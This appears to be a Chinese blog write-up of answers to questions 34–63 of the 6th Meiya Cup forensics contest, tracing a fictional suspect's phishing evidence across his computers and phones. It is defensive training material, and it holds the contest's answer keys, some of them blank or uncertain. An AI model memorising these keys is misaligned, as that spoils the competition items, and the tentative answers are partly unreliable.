<th>他们甚么时候去过Bob的家？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:2020/9/16;B:2020/8/18;C:2020/9/25;D:2020/9/30;E:2020/9/28</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>根据问法可以看出上面的题是多个人，而28号是两个人</p>
<p>根据路由器最后连接日期</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026283.png" alt="image-20211020171740475"></p>
<h2 id="35-Bob的笔记本计算机的哈希值（SHA-1）是甚么？"><a href="#35-Bob的笔记本计算机的哈希值（SHA-1）是甚么？" class="headerlink" title="35 Bob的笔记本计算机的哈希值（SHA-1）是甚么？"></a>35 Bob的笔记本计算机的哈希值（SHA-1）是甚么？</h2><table>
<thead>
<tr>
<th>Bob的笔记本计算机的哈希值（SHA-1）是甚么？</th>
<th>D</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:57701AC2194A74804DEB0F7332532D39711C5DF0;B:57705DF01AC2194A74804DEB0F7332532D39711C;C:1AC2194A74804DEB0F7332532D39711C57705DF0;D:5DF01AC2194A74804DEB0F7332532D39711C5770;E:6DF01AC2194A74804DEB0F7332532D39711C5778</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026284.png" alt="image-20211020162250013"></p>
<p>不用计算，打开 xways 直接看也能得到</p>
<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><table>
<thead>
<tr>
<th>笔记本计算机中安装了甚么电子邮件程序？</th>
<th>B</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Big Email Sender;B:Super  Email Sender;C:Bulk Email Sender;D:Super Email Sent;E:Super Email Send</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>方法一：仿真查看其桌面</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026285.png" alt="image-20211020163015430"></p>
<p>仿真可找到</p>
<p>方法二：使用 xways 查看其桌面文件可得到</p>
<h2 id="37-网络钓鱼电子邮件的接收者是储存在甚么文件？"><a href="#37-网络钓鱼电子邮件的接收者是储存在甚么文件？" class="headerlink" title="37* 网络钓鱼电子邮件的接收者是储存在甚么文件？"></a>37* 网络钓鱼电子邮件的接收者是储存在甚么文件？</h2><table>
<thead>
<tr>
<th>网络钓鱼电子邮件的接收者是储存在甚么文件？</th>
<th>A</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:NETFLIX.htm.dump;B:NETFLIX.dump;C:NETFLIXS.dump;D:NETFLIX.htm.bak;E:NETFLIX.CONTAINER</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>通过取证大师全文搜索关键词搜索可以搜到</p>
<h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><table>
<thead>
<tr>
<th>在Bob的笔记本,  有什么可疑APK及其功能？</th>
<th>A</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:检查虚拟货币的价格;B:虚拟专用网络;C:盗取登入名称及密码;D:储存私人资料;E:作为一个洋葱浏览器</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026286.png" alt="image-20211020190851964"></p>
<p>关键词搜apk，发现一个com_bitcoin_poolmonitoring,翻译过来就是A的意思，</p>
<p>发现找错了，</p>
<p>mytracker.apk是可疑apk，安卓虚拟机运行一下看看</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026287.png" alt="image-20211020193123963"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026288.png" alt="image-20211020193056744"></p>
<h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><table>
<thead>
<tr>
<th>该可疑APK  从什么网站获取资料?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:<a href="https://coinapk.io/v1/exchangerate;B:https://bit.coinapi.io/v1/exchange_rate;C:https://rest.coinapi.io/v1/exchangerate;D:https://rest.net/v1/exchangerates;E:https://online.coinapi.io/v/exchangerate">https://coinapk.io/v1/exchangerate;B:https://bit.coinapi.io/v1/exchange_rate;C:https://rest.coinapi.io/v1/exchangerate;D:https://rest.net/v1/exchangerates;E:https://online.coinapi.io/v/exchangerate</a></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>使用雷电app智能分析进行分析，</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026289.png" alt="image-20211020194754639"></p>
<p>按下面按钮</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026290.png" alt="image-20211020194708311"></p>
<p>使用雷电抓包没抓到东西，只好手搜了，解压apk后直接搜https://可找到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026291.png" alt="image-20211020195946045"></p>
<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><table>
<thead>
<tr>
<th>上述APK中发现的Bitlocker密钥是甚么？</th>
<th>B</th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:74785aaaa;B:741852963;C:72564529633;D:bob052963;E:522852693</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>见上图，找到后成功解密 Bob Dektop 计算机的 Bitlocker 加密磁盘。</p>
<p>使用app中的恢复密钥串即可成功解密</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026292.png" alt="image-20211020200637219"></p>
<h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><table>
<thead>
<tr>
<th>网络钓鱼网站的网页寄存的网站地址是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:<a href="http://zeta-onlineshop.sytes.net/wordpress/net/2019/Login;B:http://zello-onlineshop.sytes.net/wordpress/net/2020/Login;C:http://zello-onlineshop.sytes.net/nets/2020/Login;D:http://zello-easyshop.sytes.net/wordpresss/net/2020/Login;E:http://zello-onlinemet.sytes.net/wordpres/net/2020">http://zeta-onlineshop.sytes.net/wordpress/net/2019/Login;B:http://zello-onlineshop.sytes.net/wordpress/net/2020/Login;C:http://zello-onlineshop.sytes.net/nets/2020/Login;D:http://zello-easyshop.sytes.net/wordpresss/net/2020/Login;E:http://zello-onlinemet.sytes.net/wordpres/net/2020</a></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026293.png" alt="image-20211020201027427"></p>
<p>仿真这里的历史记录里可找到，看选项算送分题了</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026294.png" alt="image-20211020201107104"></p>
<h2 id="42-Bob的桌上计算机的哈希值（SHA-256）是甚么？"><a href="#42-Bob的桌上计算机的哈希值（SHA-256）是甚么？" class="headerlink" title="42 Bob的桌上计算机的哈希值（SHA-256）是甚么？"></a>42 Bob的桌上计算机的哈希值（SHA-256）是甚么？</h2><table>
<thead>
<tr>
<th>Bob的桌上计算机的哈希值（SHA-256）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:86C740D5FB096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C2673;B:267340D5FB096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C86C7;C:267386C740D5FB096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C;D:40D5FB096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C267386C7;E:B6C740D5F8096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C2673</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>不用计算，直接xways右键属性里就有</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026295.png" alt="image-20211020202850726"></p>
<h2 id="43-更多操作Bob的桌上计算机的安装时间是几点？-本地时间"><a href="#43-更多操作Bob的桌上计算机的安装时间是几点？-本地时间" class="headerlink" title="43 更多操作Bob的桌上计算机的安装时间是几点？(本地时间)"></a>43 更多操作Bob的桌上计算机的安装时间是几点？(本地时间)</h2><table>
<thead>
<tr>
<th>Bob的桌上计算机的安装时间是几点？(本地时间)</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:2020/9/13 1:40:00;B:2020/9/15 3:40:00;C:2020/9/17 2:40:00;D:2020/9/15 5:40:00;E:2020/9/15 18:40:00</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026296.png" alt="image-20211020203655796"></p>
<h2 id="44-Bob桌上计算机内发现的网络钓鱼脚本是甚么？-某些字符被刻意用-遮盖"><a href="#44-Bob桌上计算机内发现的网络钓鱼脚本是甚么？-某些字符被刻意用-遮盖" class="headerlink" title="44 Bob桌上计算机内发现的网络钓鱼脚本是甚么？(某些字符被刻意用*遮盖)"></a>44 Bob桌上计算机内发现的网络钓鱼脚本是甚么？(某些字符被刻意用*遮盖)</h2><table>
<thead>
<tr>
<th>Bob桌上计算机内发现的网络钓鱼脚本是甚么？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:d<strong>nload.zip;B:</strong>ternal.zip;C:i<em>t</em>r.zip;D:out<strong>.zip;E:ex</strong>rnal.zip</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>根据文件分类，zip 后缀就 4 个，对比之前 Zello-onlineshop webserver 上的文件，可 以确认就是钓鱼程序，之前做 Zello 部分题目的时候 inter.zip 比较可疑，它是钓鱼站的 备份文件。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026297.png" alt="image-20211020204605568"></p>
<h2 id="45-该网络钓鱼脚本的功能是甚么？"><a href="#45-该网络钓鱼脚本的功能是甚么？" class="headerlink" title="45 该网络钓鱼脚本的功能是甚么？"></a>45 该网络钓鱼脚本的功能是甚么？</h2><table>
<thead>
<tr>
<th>该网络钓鱼脚本的功能是甚么？</th>
<th>C</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:摧毁目标电脑;B:传播电脑病毒;C:收集个人数据;D:发送勒索信息;E:自动化进行分布式拒绝服务攻击</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026298.png" alt="image-20211020205000913">扫一下，前面题目也有所涉及</p>
<h2 id="46-在Bob-iphone-与Alice和Cole通讯记录的完整路径是甚么？"><a href="#46-在Bob-iphone-与Alice和Cole通讯记录的完整路径是甚么？" class="headerlink" title="46 在Bob iphone, 与Alice和Cole通讯记录的完整路径是甚么？"></a>46 在Bob iphone, 与Alice和Cole通讯记录的完整路径是甚么？</h2><table>
<thead>
<tr>
<th>在Bob iphone, 与Alice和Cole通讯记录的完整路径是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:File List\User App  List\Application/ChatStorage.sqlite     Table:ZWAMESSAGE(ZCHATSESSION:4);B:File List\Download File  List\Temp/group.net.WhatsApp.shared/ChatStorage.sqlite     Table:ZWAMESSAGE(ZCHATSESSION:3);C:File List\User File List/group.net.WhatsApps.shared/ChatStorage.sqlite     Table:MESSAGE(ZCHATSESSION:4);D:File List\User File  List\Applications/Group/group.net.WhatsApp.shared/ChatStorage.sqlite     Table:ZWAMESSAGE(ZCHATSESSION:4);E: List\Temp File  List\Applications/Chat/group.net.WhatsApp.share/ChatStorage.sqlite     Table:SESSION:4)</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>涉及到iPhone，将iPhone导入火眼</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026299.png" alt="image-20211020205501072"></p>
<p>需要一个备份密码</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026300.png" alt="image-20211020205550987"></p>
<p>iPhone备份文件ufd这里可以找到备份文件的密码</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026301.png" alt="image-20211020205807405"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026302.png" alt="image-20211021093315607"></p>
<h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><table>
<thead>
<tr>
<th>Bob的iPhone的苹果ID是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:<a href="mailto:bobcheung123@gmail.com">bobcheung123@gmail.com</a>;B:<a href="mailto:bobcheung@yahoo.com">bobcheung@yahoo.com</a>;C:<a href="mailto:bobcheung@gmail.com">bobcheung@gmail.com</a>;D:<a href="mailto:bob23@gmail.com">bob23@gmail.com</a>;E:bobcheung123@hotmaillcom</th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026303.png" alt="image-20211021083545205"></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026303.png" alt="image-20211021083545205"></p>
<h2 id="48"><a href="#48" class="headerlink" title="48"></a>48</h2><table>
<thead>
<tr>
<th>Bob的iPhone的IMEI是甚么？</th>
<th>*</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:13421004458835;B:23421224458835;C:144410044508835;D:934218004458888;E:23421084450035</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026304.png" alt="image-20211021093429008"></p>
<p>或者火眼直接也能取到</p>
<h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><table>
<thead>
<tr>
<th>Bob  iPhone的时区设置是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:UTC +8;B:UTC +0;C:UTC  -8;D:UTC -10;E:UTC + 6</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://forensics.xidian.edu.cn/wiki/imgbc/image-20201126180435037.png" alt="image-20201126180435037"></p>
<p>在这个device_values.plist能看到iPhone的时区信息</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026305.png" alt="image-20211021110729592"></p>
<h2 id="50"><a href="#50" class="headerlink" title="50"></a>50</h2><table>
<thead>
<tr>
<th>文件“  VIP.txt”的完整路径是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Bob/mobile/DCIM/Shared/AppGroup/group.whatsapp.WhatsApp.shared      /Message/Media//5/c56255d0-a407-4341-afef-7bf5accc52f0.txt;B:Bob/Phone/Containers/Shared/AppGroup/group.net.whatsapps.WhatsApp.shared     /Message/Media/85262547937-1600392878@g.us/c/5/1230.txt;C:Bob/Data/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApps.shared      /Message/Media/85262547937-1600392878@g.us/c/5/c56255d0-a407-4341-afef-7bf5accc52f0.txt;D:Bob/Text/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.shared      /Messages/Media/85262547937-1600392878@g.us/c/5/c56255d0-a407-4341-afef-7bf5accc5000.txt;E:Bob/mobile/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.shared     /Message/Media/85262547937-1600392878@g.us/c/5/c56255d0-a407-4341-afef-7bf5accc52f0.txt</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>3个txt都看一下</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026306.png" alt="image-20211021140322747"></p>
<h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><table>
<thead>
<tr>
<th>在Bob iphone, 谁是“ <a href="mailto:85262547937-1600392878@g.us">85262547937-1600392878@g.us</a>”的聊天群组中的管理员？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Bob;B:Cole;C:Alice;D:Alice 及  Bob;E:Bob 及 Cole</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026307.png" alt="image-20211021140738388"></p>
<p>从资格赛 Alice 的手机记录中分析得到，这个群聊的创建者（即管理员）为 Alice</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026308.png" alt="image-20211021141007233"></p>
<h2 id="52-“-85262547937-1600392878-g-us”聊天群组中有多少个附件？"><a href="#52-“-85262547937-1600392878-g-us”聊天群组中有多少个附件？" class="headerlink" title="52 *“  85262547937-1600392878@g.us”聊天群组中有多少个附件？"></a>52 *“  <a href="mailto:85262547937-1600392878@g.us">85262547937-1600392878@g.us</a>”聊天群组中有多少个附件？</h2><table>
<thead>
<tr>
<th>“  <a href="mailto:85262547937-1600392878@g.us">85262547937-1600392878@g.us</a>”聊天群组中有多少个附件？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:6;B:4;C:2;D:3;E:6</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>2，一个图片一个txt文件</p>
<p>软件只看到两个，在路径下发现有 4 个，一个图片，一个文件，2 个.thumb</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026309.png" alt="image-20211021141556413"></p>
<p>用手机大师看，内容类型进行排序，发现有三个文件一张图片</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026310.png" alt="image-20211031162214620"></p>
<h2 id="53-Bob-iPhone的Airdrop-ID是甚么？"><a href="#53-Bob-iPhone的Airdrop-ID是甚么？" class="headerlink" title="53* Bob  iPhone的Airdrop ID是甚么？"></a>53* Bob  iPhone的Airdrop ID是甚么？</h2><table>
<thead>
<tr>
<th>Bob  iPhone的Airdrop ID是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:66E7BBDE9F69;B:Bob-airdrop-28455;C:67E7BBDE9F69-BOB;D:Air-Bob-66E7BBDE9F69;E:Bob-iP-66E7BBDE9F69</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>手机大师文件导入选择iTunes备份文件，找到Snapchat文件夹可取证</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026311.png" alt="image-20211030173151194"></p>
<h2 id="54"><a href="#54" class="headerlink" title="54"></a>54</h2><table>
<thead>
<tr>
<th>Bob的iPhone的操作系统版本是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:10.3.3;B:10.2.1;C:12.3.1;D:13.3.2;E:10.3.5</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026312.png" alt="image-20211021142124772"></p>
<h2 id="55"><a href="#55" class="headerlink" title="55"></a>55</h2><table>
<thead>
<tr>
<th>Bob在2020-09-17的1451时访问的连结是甚么？(UTC + 0)</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:<a href="https://www.apple.com;B:https://www.hackertestinghelp.com/ddos-attack-tools/">https://www.apple.com;B:https://www.hackertestinghelp.com/ddos-attack-tools/</a>  (Title:8 Best DDoS Attack Tools (Free DDoS Tool Of The Year  2020));C:<a href="https://www.textttestinghelp.com/ddos-attack-tool/amp/">https://www.textttestinghelp.com/ddos-attack-tool/amp/</a> (Title:8 Best  DDoS Attack Tools (Free DDoS Tool Of The Year  2020));D:<a href="https://www.softwaretestinghelp.com/bruteforce-attack-tools/amp/">https://www.softwaretestinghelp.com/bruteforce-attack-tools/amp/</a>  (Title:8 Best DDoS Attack Tools (Free DDoS Tool Of The Year  2019));E:<a href="https://www.softwaretestinghelp.com/ddos-attack-tools/amp/">https://www.softwaretestinghelp.com/ddos-attack-tools/amp/</a> (Title:8  Best DDoS Attack Tools (Free DDoS Tool Of The Year 2020))</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026314.png" alt="image-20211021144647134"></p>
<p>或者手机大师里的搜索证据，按时间范围搜索</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026315.png" alt="image-20211031162512387"></p>
<h2 id="56-Bob的Samsung-S2的Android-ID是甚么？"><a href="#56-Bob的Samsung-S2的Android-ID是甚么？" class="headerlink" title="56 Bob的Samsung  S2的Android ID是甚么？"></a>56 Bob的Samsung  S2的Android ID是甚么？</h2><table>
<thead>
<tr>
<th>Bob的Samsung  S2的Android ID是甚么？</th>
<th>E</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:072af229d1da3b3cd;B:71af229d1da3b3cdd;C:Bob72af229d1da3b3cd;D:72af229d1da3b3cd;E:Bob-72af229d1da3b3cd</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026316.png" alt="image-20211021150052092"></p>
<h2 id="57"><a href="#57" class="headerlink" title="57"></a>57</h2><table>
<thead>
<tr>
<th>Bob的Samsung  S2的操作系统版本是甚么？</th>
<th>E</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:4.1.5;B:4.0.1;C:4.0.2;D:4.2.3;E:4.1.2</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026317.png" alt="image-20211021145158512"></p>
<h2 id="58"><a href="#58" class="headerlink" title="58"></a>58</h2><table>
<thead>
<tr>
<th>Bob  Samsung S2的时区设置是甚么？</th>
<th>A</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Asia/Hong_Kong;B:Asia/Damascus;C:Asia/Baku;D:Asia/Bangkok;E:Asia/Tokyo</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026318.png" alt="image-20211021145208972"></p>
<p>手机大师搜索关键字timezone</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026319.png" alt="image-20211031162801124"></p>
<h2 id="59"><a href="#59" class="headerlink" title="59"></a>59</h2><table>
<thead>
<tr>
<th>“  bitcoin.PNG”的储存位置是甚么？</th>
<th>C</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:data  (ExtX)/Root/media/DCIM/;B:userdata (Ext)/Root/Download/;C:userdata  (ExtX)/Root/media/D                                                                                                                                                                                                                                                                              CIM/;D:userdata/Root//DCIM/;E:userdata (ExtX)/Root/APK/</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>搜一下图片名</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026320.png" alt="image-20211021150128956"></p>
<h2 id="60"><a href="#60" class="headerlink" title="60"></a>60</h2><table>
<thead>
<tr>
<th>bitcoin.PNG的哈希值（SHA-256）是甚么？</th>
<th>D</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:b0d5adba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b479a;B:0d5b479aadba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b;C:adba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b0d5b479a;D:479aadba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b0d5b;E:450aadba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>算就完事了</p>
<h2 id="61"><a href="#61" class="headerlink" title="61"></a>61</h2><table>
<thead>
<tr>
<th>Bob的Samsung  S2的wifi mac地址是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:21:60:C0:4B:75:11;B:61:21:4B:C0:75:11;C:60:21:C0:BB:11:75;D:60:21:C0:4B:75:11;E:DD:60:21:4B:75:11</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026321.png" alt="image-20211021150240724"></p>
<h2 id="62"><a href="#62" class="headerlink" title="62"></a>62</h2><table>
<thead>
<tr>
<th>“  userdata（ExtX）/ Root / media / Download / APK Testing”中的有多少APK檔？</th>
<th>B</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:7;B:10;C:8;D:9;E:6</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026322.png" alt="image-20211021150410235"></p>
<p>2个zip，另外10个apk</p>
<h2 id="63"><a href="#63" class="headerlink" title="63"></a>63</h2><table>
<thead>
<tr>
<th>Messagesecure.apk的哈希值（SHA-256）是甚么？</th>
<th>B</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:b4bf2eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623ae57;B:ae572eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623b4bf;C:de57ae572eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623b4bf;D:bd572eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623b4bfb4bf;E:ae025eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623b4bfae57</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>算</p>
